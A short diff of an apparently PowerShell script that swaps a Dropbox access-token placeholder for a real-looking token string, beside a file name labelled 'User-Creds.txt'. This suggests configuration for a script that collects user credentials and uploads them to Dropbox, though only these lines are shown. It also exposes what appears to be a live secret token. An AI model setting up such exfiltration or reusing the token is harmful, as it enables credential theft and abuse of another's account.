@@ -20,7 +20,7 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$DropBoxAccessToken = "<YOUR DROPBOX ACCESS TOKEN HERE>"
+$DropBoxAccessToken = "sl.B140VmdbSxGqH5-bQeBD-kXKCAA_JxdnOVPusn7HvSfSmtGBgYwx7rc4cC0aIrMNBtz9Xa7litN24J9XwoR0OurVd_8lQgSRIrXpUGkeE9IXXNFVhh1UfGRSQvyc0Vz70L50lD6LF10T"
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
